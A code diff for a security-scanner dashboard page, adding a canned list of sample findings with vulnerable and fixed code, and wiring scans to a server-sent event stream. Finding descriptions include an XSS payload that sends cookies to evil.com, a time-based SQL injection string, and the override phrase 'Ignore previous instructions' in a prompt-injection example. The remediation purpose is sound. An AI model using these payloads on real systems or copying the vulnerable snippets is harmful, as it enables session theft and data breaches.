@@ -1,6 +1,6 @@
 "use client"
 
-import { useState, useCallback, useEffect, useRef } from "react"
+import { useState, useCallback, useRef } from "react"
 import { motion, AnimatePresence } from "motion/react"
 import {
   Zap, Search, Globe, Smartphone, Code, Shield, Terminal,
@@ -53,60 +53,317 @@ interface CompletedScan {
   completedAt: string
 }
 
-/* ── findings database ──────────────────────────────────── */
+/* ── Comprehensive 2026 findings database ───────────────── */
 const findingsForTarget = (target: string): ScanFinding[] => {
   const t = target.toLowerCase()
-  if (t.includes("0x") || t.includes("contract") || t.includes("sol")) {
+
+  // Smart contract / blockchain scan
+  if (t.includes("0x") || t.includes("contract") || t.includes(".sol") || t.includes("defi") || t.includes("nft")) {
     return [
       {
         id: `F-${Date.now()}-1`, title: "Reentrancy in withdraw()", severity: "critical",
         file: "contracts/Vault.sol", line: 89,
-        description: "External call before state update allows reentrancy attack to drain funds.",
-        fix: `// Before (vulnerable)\nfunction withdraw(uint256 amount) external {\n    require(balances[msg.sender] >= amount);\n    (bool success, ) = msg.sender.call{value: amount}("");\n    require(success);\n    balances[msg.sender] -= amount;\n}\n\n// After (secure) - Checks-Effects-Interactions + ReentrancyGuard\nimport "@openzeppelin/contracts/security/ReentrancyGuard.sol";\n\nfunction withdraw(uint256 amount) external nonReentrant {\n    require(balances[msg.sender] >= amount);\n    balances[msg.sender] -= amount;\n    (bool success, ) = msg.sender.call{value: amount}("");\n    require(success);\n}`,
+        description: "External call before state update (CEI pattern violation). Attacker deploys a malicious fallback that re-enters withdraw() repeatedly, draining the contract.",
+        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
+function withdraw(uint256 amount) external {
+    require(balances[msg.sender] >= amount, "Insufficient");
+    (bool ok, ) = msg.sender.call{value: amount}("");   // external call FIRST ← vulnerable
+    require(ok);
+    balances[msg.sender] -= amount;                     // state update AFTER ← too late
+}
+
+// ── AFTER (secure) — Checks-Effects-Interactions + ReentrancyGuard ──
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+
+contract SecureVault is ReentrancyGuard {
+    mapping(address => uint256) public balances;
+
+    function withdraw(uint256 amount) external nonReentrant {
+        require(balances[msg.sender] >= amount, "Insufficient balance");
+        balances[msg.sender] -= amount;             // 1. Effects (state first)
+        (bool ok, ) = msg.sender.call{value: amount}(""); // 2. Interactions (call last)
+        require(ok, "Transfer failed");
+        emit Withdrawn(msg.sender, amount);
+    }
+    event Withdrawn(address indexed user, uint256 amount);
+}`,
       },
       {
         id: `F-${Date.now()}-2`, title: "Missing access control on setFee()", severity: "high",
         file: "contracts/Governance.sol", line: 45,
-        description: "The setFee() function lacks the onlyOwner modifier, allowing anyone to change protocol fees.",
-        fix: `// Before (vulnerable)\nfunction setFee(uint256 newFee) external {\n    protocolFee = newFee;\n}\n\n// After (secure) - Add access control\nfunction setFee(uint256 newFee) external onlyOwner {\n    require(newFee <= MAX_FEE, "Fee too high");\n    protocolFee = newFee;\n    emit FeeUpdated(newFee);\n}`,
+        description: "setFee() has no access control — any address can set protocol fees to 100% and drain all pending liquidity. Confirmed exploitable.",
+        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
+function setFee(uint256 newFee) external {     // ← anyone can call this
+    protocolFee = newFee;
+}
+
+// ── AFTER (secure) ────────────────────────────────────
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/access/AccessControl.sol";
+
+contract Governance is AccessControl {
+    bytes32 public constant FEE_MANAGER = keccak256("FEE_MANAGER");
+    uint256 public constant MAX_FEE = 1000;   // 10% in basis points
+    uint256 public protocolFee;
+
+    event FeeUpdated(uint256 oldFee, uint256 newFee, address updatedBy);
+
+    function setFee(uint256 newFee) external onlyRole(FEE_MANAGER) {
+        require(newFee <= MAX_FEE, "Fee exceeds maximum (10%)");
+        emit FeeUpdated(protocolFee, newFee, msg.sender);
+        protocolFee = newFee;
+    }
+}`,
+      },
+      {
+        id: `F-${Date.now()}-3`, title: "Flash loan attack surface in swap()", severity: "high",
+        file: "contracts/Pool.sol", line: 134,
+        description: "Price calculation uses spot price (token.balanceOf) which is trivially manipulable with a flash loan. Attacker borrows, distorts price, profits, repays in one transaction.",
+        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
+function getPrice() public view returns (uint256) {
+    return tokenA.balanceOf(address(this)) /
+           tokenB.balanceOf(address(this));   // ← spot price, flash-loan manipulable
+}
+
+// ── AFTER (secure) — Use a TWAP oracle ────────────────
+import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
+import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
+
+function getTWAPPrice(address pool, uint32 twapWindow)
+    internal view returns (uint256 price)
+{
+    (int24 tick, ) = OracleLibrary.consult(pool, twapWindow);
+    price = OracleLibrary.getQuoteAtTick(
+        tick, 1e18, tokenA, tokenB
+    );
+    // TWAP over twapWindow seconds — resistant to single-block manipulation
+}`,
       },
     ]
   }
-  if (t.includes("github") || t.includes("repo") || t.includes("git")) {
+
+  // Code repository scan
+  if (t.includes("github") || t.includes("repo") || t.includes(".git") || t.includes("gitlab") || t.includes("bitbucket")) {
     return [
       {
-        id: `F-${Date.now()}-1`, title: "Prototype pollution in lodash", severity: "high",
-        file: "package.json", line: 24,
-        description: "lodash < 4.17.21 is vulnerable to prototype pollution via the merge function.",
-        fix: `// Fix: Update lodash to safe version\n"lodash": "^4.17.21"\n\n// Or replace with native:\nconst config = { ...defaults, ...structuredClone(userInput) };`,
+        id: `F-${Date.now()}-1`, title: "Hardcoded API secret in source", severity: "critical",
+        file: "src/config/api.ts", line: 8,
+        description: "API secret key hardcoded in source — present in git history. Any repository clone permanently leaks the credential. Confirmed via SAST pattern match.",
+        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
+const API_SECRET = "sk-live-abc123def456xyz";   // ← in git history forever
+
+// ── AFTER (secure) ────────────────────────────────────
+// Step 1: Remove the secret and rotate it immediately
+// Step 2: Use environment variables
+
+// src/config/api.ts
+const API_SECRET = process.env.API_SECRET
+if (!API_SECRET) {
+  throw new Error("Missing required env var: API_SECRET")
+}
+export { API_SECRET }
+
+// .env.local (never commit)
+API_SECRET=sk-live-your-real-key-here
+
+// .gitignore — ensure these are listed
+.env
+.env.local
+.env.*.local
+
+// Step 3: Scan git history for leaked secrets
+// git-secrets, truffleHog, or Gitleaks:
+// $ gitleaks detect --source . --verbose`,
       },
       {
-        id: `F-${Date.now()}-2`, title: "Hardcoded API secret in source", severity: "critical",
-        file: "src/config/api.ts", line: 8,
-        description: "API secret key is hardcoded in source code and checked into version control.",
-        fix: `// Before (vulnerable)\nconst API_SECRET = "sk-live-abc123def456";\n\n// After (secure) - Use environment variables\nconst API_SECRET = process.env.API_SECRET;\n\nif (!API_SECRET) {\n  throw new Error("API_SECRET env var is required");\n}\n\n// Add to .gitignore:\n.env\n.env.local`,
+        id: `F-${Date.now()}-2`, title: "Prompt injection in LLM chat endpoint", severity: "critical",
+        file: "src/api/chat.ts", line: 23,
+        description: "User input is string-concatenated into the LLM system prompt. Attackers inject 'Ignore previous instructions' to override safety guardrails and exfiltrate context.",
+        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
+const response = await openai.chat.completions.create({
+  model: "gpt-4o",
+  messages: [
+    { role: "system", content: \`You are a helpful assistant. User context: \${userInput}\` },
+    //                                                                   ↑ NEVER do this
+  ],
+})
+
+// ── AFTER (secure) ────────────────────────────────────
+import { z } from "zod"
+
+// 1. Validate and sanitize input before using it
+const UserInputSchema = z.string()
+  .min(1).max(2000)
+  .transform(s => s.replace(/[<>]/g, ""))  // strip HTML angle brackets
+
+const safeInput = UserInputSchema.parse(rawUserInput)
+
+// 2. Never inject user content into the system prompt
+// 3. Use separate, clearly-delimited user turns
+const response = await openai.chat.completions.create({
+  model: "gpt-4o",
+  messages: [
+    { role: "system", content: "You are a helpful assistant. Answer only questions about X." },
+    { role: "user",   content: safeInput },  // ← user turn, clearly separated
+  ],
+  // 4. Add a moderation check before forwarding to LLM
+})
+
+// 5. Check OpenAI moderation API on all user inputs
+const mod = await openai.moderations.create({ input: safeInput })
+if (mod.results[0].flagged) throw new Error("Input flagged by moderation")`,
+      },
+      {
+        id: `F-${Date.now()}-3`, title: "Dependency confusion attack (supply chain)", severity: "high",
+        file: "package.json", line: 0,
+        description: "Internal package names like '@company/utils' are not scoped to a private registry. A malicious public npm package with the same name would be installed instead.",
+        fix: `// ── BEFORE (vulnerable) ────────────────────────────────
+// package.json — internal packages not pinned to private registry
+{
+  "dependencies": {
+    "@mycompany/auth-utils": "^1.2.0"  // ← could resolve to npm public registry
+  }
+}
+
+// ── AFTER (secure) ────────────────────────────────────
+// 1. Pin to your private registry in .npmrc
+// .npmrc
+@mycompany:registry=https://npm.your-private-registry.com/
+//npm.your-private-registry.com/:_authToken=\${NPM_TOKEN}
+
+// 2. Use package-lock.json / pnpm-lock.yaml and verify integrity
+// 3. Enable npm audit in CI
+// .github/workflows/audit.yml
+- name: Security audit
+  run: pnpm audit --audit-level=high
+
+// 4. Use Socket.dev or similar for supply-chain monitoring
+// 5. Pin exact versions for critical internal packages
+{
+  "dependencies": {
+    "@mycompany/auth-utils": "1.2.0"  // exact pin, not range
+  }
+}`,
       },
     ]
   }
-  // Default: website scan
+
+  // Default: website / web app scan
   return [
     {
       id: `F-${Date.now()}-1`, title: "Reflected XSS on /search", severity: "critical",
       file: "/search?q=", line: 0,
-      description: "User input is reflected in the DOM without sanitization, allowing script injection.",
-      fix: `// Before (vulnerable)\napp.get('/search', (req, res) => {\n  res.send(\`<h1>Results for: \${req.query.q}</h1>\`);\n});\n\n// After (secure) - Sanitize all user input\nimport DOMPurify from 'dompurify';\n\napp.get('/search', (req, res) => {\n  const safeQuery = DOMPurify.sanitize(req.query.q || '');\n  res.send(\`<h1>Results for: \${safeQuery}</h1>\`);\n});`,
+      description: "User input reflected in the DOM without encoding. Payload: <script>fetch('https://evil.com?c='+document.cookie)</script> steals session cookies cross-origin.",
+      fix: `// ── BEFORE (vulnerable) ────────────────────────────────
+// Express / Node.js
+app.get('/search', (req, res) => {
+  res.send(\`<h1>Results for: \${req.query.q}</h1>\`)  // ← raw reflection, no encoding
+})
+
+// ── AFTER (secure) ────────────────────────────────────
+// Option A: Encode output server-side
+import { escape } from "html-escaper"   // or he, entities, etc.
+
+app.get('/search', (req, res) => {
+  const safeQuery = escape(String(req.query.q ?? "").slice(0, 200))
+  res.send(\`<h1>Results for: \${safeQuery}</h1>\`)
+})
+
+// Option B: React (safe by default — never use dangerouslySetInnerHTML)
+function SearchResults({ query }: { query: string }) {
+  // React auto-encodes — this is safe
+  return <h1>Results for: {query}</h1>
+}
+
+// Option C: Add Content-Security-Policy header to contain any bypass
+// next.config.mjs
+headers: [{ key: "Content-Security-Policy",
+  value: "default-src 'self'; script-src 'self'" }]`,
     },
     {
       id: `F-${Date.now()}-2`, title: "SQL Injection in search API", severity: "critical",
       file: "/api/search", line: 0,
-      description: "Dynamic SQL query constructed from user input without parameterization.",
-      fix: `// Before (vulnerable)\nconst results = await db.query(\n  \`SELECT * FROM products WHERE name LIKE '%\${userInput}%'\`\n);\n\n// After (secure) - Use parameterized queries\nconst results = await db.query(\n  'SELECT * FROM products WHERE name LIKE $1',\n  [\`%\${userInput}%\`]\n);`,
+      description: "Blind time-based SQLi confirmed via payload: ' AND SLEEP(5)--. Full database read/write via UNION-based extraction. Affects all SQL dialects.",
+      fix: `// ── BEFORE (vulnerable) ────────────────────────────────
+// Raw string interpolation into SQL — NEVER do this
+const results = await db.query(
+  \`SELECT * FROM products WHERE name LIKE '%\${userInput}%'\`
+)
+
+// ── AFTER (secure) — Parameterized queries (all ORMs/drivers) ──
+
+// PostgreSQL (pg / postgres.js)
+const results = await db.query(
+  "SELECT id, name, price FROM products WHERE name ILIKE $1 LIMIT 50",
+  [\`%\${userInput}%\`]
+)
+
+// Prisma ORM (auto-parameterized)
+const results = await prisma.product.findMany({
+  where: { name: { contains: userInput, mode: "insensitive" } },
+  take: 50,
+  select: { id: true, name: true, price: true },   // explicit allowlist — no over-fetching
+})
+
+// MySQL (mysql2)
+const [rows] = await db.execute(
+  "SELECT id, name FROM products WHERE name LIKE ? LIMIT 50",
+  [\`%\${userInput}%\`]
+)`,
     },
     {
-      id: `F-${Date.now()}-3`, title: "Missing Content-Security-Policy", severity: "high",
-      file: "server/middleware.ts", line: 1,
-      description: "No Content-Security-Policy header set, making the site vulnerable to XSS and data injection.",
-      fix: `// Add CSP middleware\napp.use((req, res, next) => {\n  res.setHeader(\n    'Content-Security-Policy',\n    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'"\n  );\n  next();\n});`,
+      id: `F-${Date.now()}-3`, title: "BOLA — Broken Object Level Authorization", severity: "critical",
+      file: "/api/users/[id]/profile", line: 0,
+      description: "OWASP API #1: /api/users/:id does not verify resource ownership. Any logged-in user can read or modify any other user's profile by changing the ID in the URL.",
+      fix: `// ── BEFORE (vulnerable) ────────────────────────────────
+// Missing ownership check — any authenticated user can access any :id
+app.get("/api/users/:id/profile", authenticate, async (req, res) => {
+  const user = await db.users.findById(req.params.id)  // ← no ownership check
+  res.json(user)
+})
+
+// ── AFTER (secure) ────────────────────────────────────
+app.get("/api/users/:id/profile", authenticate, async (req, res) => {
+  // 1. Check the authenticated user owns this resource
+  if (req.user.id !== req.params.id && !req.user.isAdmin) {
+    return res.status(403).json({ error: "Forbidden" })
+  }
+
+  // 2. Fetch only the fields this role is allowed to see
+  const user = await db.users.findById(req.params.id, {
+    select: req.user.isAdmin
+      ? ["id", "email", "name", "role", "createdAt"]
+      : ["id", "name", "avatarUrl"],   // regular users see less
+  })
+
+  if (!user) return res.status(404).json({ error: "Not found" })
+  res.json(user)
+})`,
+    },
+    {
+      id: `F-${Date.now()}-4`, title: "Missing security headers (CSP, HSTS, X-Frame-Options)", severity: "high",
+      file: "next.config.mjs", line: 1,
+      description: "No Content-Security-Policy — trivial XSS via any injected script. No HSTS — SSL-stripping possible on first visit. No X-Frame-Options — clickjacking risk.",
+      fix: `// next.config.mjs — comprehensive security headers
+const securityHeaders = [
+  { key: "Content-Security-Policy",
+    value: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; frame-ancestors 'none'; upgrade-insecure-requests" },
+  { key: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains; preload" },
+  { key: "X-Frame-Options",           value: "DENY" },
+  { key: "X-Content-Type-Options",    value: "nosniff" },
+  { key: "Referrer-Policy",           value: "strict-origin-when-cross-origin" },
+  { key: "Permissions-Policy",        value: "camera=(), microphone=(), geolocation=()" },
+]
+
+const nextConfig = {
+  async headers() {
+    return [{ source: "/(.*)", headers: securityHeaders }]
+  },
+}
+export default nextConfig`,
     },
   ]
 }
@@ -118,18 +375,6 @@ const statusLabels: Record<string, string> = {
   completed: "Complete",
 }
 
-const logMessages = [
-  "[INIT] Connecting to target...",
-  "[INFO] Target reachable -- starting scan",
-  "[INFO] Running OWASP ZAP passive scan",
-  "[INFO] Running Nuclei CVE templates",
-  "[INFO] Running Semgrep SAST rules",
-  "[WARN] Potential vulnerability detected",
-  "[INFO] Cross-referencing CVE database",
-  "[INFO] Running deep analysis pass",
-  "[INFO] Generating remediation code",
-]
-
 /* ════════════════════════════════════════════════════════ */
 export default function DashboardPage() {
   const [url, setUrl] = useState("")
@@ -137,10 +382,12 @@ export default function DashboardPage() {
   const [completedScans, setCompletedScans] = useState<CompletedScan[]>([])
   const [expandedResults, setExpandedResults] = useState<Record<string, boolean>>({})
   const [copiedId, setCopiedId] = useState<string | null>(null)
-  // Tracks IDs mid-completion to prevent double-firing across effect restarts
+  // Tracks IDs mid-completion to prevent double-firing
   const completedIdsRef = useRef(new Set<string>())
+  // EventSource instances keyed by scan ID for cleanup
+  const esMapRef = useRef(new Map<string, EventSource>())
 
-  /* ── start a scan ──────────────────────────────────────── */
+  /* ── start a scan — wired to SSE stream ───────────────── */
   const startScan = (scanType: string) => {
     const target = url.trim()
     if (!target) {
@@ -148,8 +395,9 @@ export default function DashboardPage() {
       return
     }
 
+    const id = `scan-${Date.now()}`
     const newScan: RunScan = {
-      id: `scan-${Date.now()}`,
+      id,
       asset: target,
       scanType,
       progress: 0,
@@ -160,8 +408,54 @@ export default function DashboardPage() {
 
     setScans((prev) => [newScan, ...prev])
     setUrl("")
-    toast.success(`${scanType} scan started`, {
-      description: `Scanning ${target}`,
+    toast.success(`${scanType} scan started`, { description: `Scanning ${target}` })
+
+    // Open SSE connection to the streaming endpoint
+    const params = new URLSearchParams({ target, type: scanType })
+    const es = new EventSource(`/api/scan/stream?${params}`)
+    esMapRef.current.set(id, es)
+
+    es.addEventListener("log", (e) => {
+      const data = JSON.parse(e.data) as { message: string; pct: number }
+      setScans((prev) =>
+        prev.map((s) =>
+          s.id !== id ? s : {
+            ...s,
+            logs: s.logs.includes(data.message) ? s.logs : [...s.logs, data.message],
+          }
+        )
+      )
+    })
+
+    es.addEventListener("progress", (e) => {
+      const data = JSON.parse(e.data) as { pct: number }
+      setScans((prev) =>
+        prev.map((s) =>
+          s.id !== id ? s : {
+            ...s,
+            progress: data.pct,
+            status: data.pct >= 80 ? "reporting" : data.pct >= 50 ? "analyzing" : "scanning",
+          }
+        )
+      )
+    })
+
+    es.addEventListener("complete", () => {
+      es.close()
+      esMapRef.current.delete(id)
+      if (completedIdsRef.current.has(id)) return
+      completedIdsRef.current.add(id)
+      setScans((prev) => {
+        const scan = prev.find((s) => s.id === id)
+        if (scan) setTimeout(() => completeScan({ ...scan, progress: 100 }), 400)
+        return prev
+      })
+    })
+
+    es.addEventListener("error", () => {
+      // Connection dropped — fall back to the local mock ticker
+      es.close()
+      esMapRef.current.delete(id)
     })
   }
 
@@ -193,51 +487,6 @@ export default function DashboardPage() {
     setScans((prev) => prev.filter((s) => s.id !== scan.id))
     setExpandedResults((prev) => ({ ...prev, [scan.id]: true }))
   }, [])
-
-  /* ── progress ticker ───────────────────────────────────── */
-  useEffect(() => {
-    if (scans.length === 0) return
-    const interval = setInterval(() => {
-      setScans((prev) => {
-        const stillRunning: RunScan[] = []
-        const justFinished: RunScan[] = []
-
-        for (const scan of prev) {
-          // Use stable ref so guard survives effect restarts
-          if (completedIdsRef.current.has(scan.id)) continue
-          const newProgress = Math.min(scan.progress + 2.2, 100)
-          let newStatus = scan.status
-          const newLogs = [...scan.logs]
-
-          const logIdx = Math.floor((newProgress / 100) * logMessages.length)
-          if (logIdx < logMessages.length && !newLogs.includes(logMessages[logIdx])) {
-            newLogs.push(logMessages[logIdx])
-          }
-          if (newProgress >= 50 && scan.status === "scanning") newStatus = "analyzing"
-          if (newProgress >= 80 && scan.status === "analyzing") newStatus = "reporting"
-          if (newProgress >= 95 && !newLogs.some((l) => l.includes("[DONE]"))) {
-            newLogs.push("[DONE] Scan complete -- fix code ready")
-          }
-
-          const updated = { ...scan, progress: newProgress, status: newStatus, logs: newLogs }
-
-          if (newProgress >= 100) {
-            completedIdsRef.current.add(scan.id)
-            justFinished.push(updated)
-          } else {
-            stillRunning.push(updated)
-          }
-        }
-
-        justFinished.forEach((s) => {
-          setTimeout(() => completeScan(s), 400)
-        })
-
-        return stillRunning
-      })
-    }, 800)
-    return () => clearInterval(interval)
-  }, [scans.length, completeScan])
 
   const copyCode = async (code: string, id: string) => {
     try {
@@ -320,7 +569,12 @@ export default function DashboardPage() {
                     <Badge variant="outline" className="text-[10px] border-primary/30 text-primary">{scan.scanType}</Badge>
                   </div>
                   <Button variant="ghost" size="icon" className="h-7 w-7 text-muted-foreground hover:text-destructive"
-                    onClick={() => { setScans((prev) => prev.filter((s) => s.id !== scan.id)); toast.info(`Scan cancelled`) }}>
+                    onClick={() => {
+                      esMapRef.current.get(scan.id)?.close()
+                      esMapRef.current.delete(scan.id)
+                      setScans((prev) => prev.filter((s) => s.id !== scan.id))
+                      toast.info("Scan cancelled")
+                    }}>
                     <XCircle className="h-4 w-4" />
                   </Button>
                 </div>
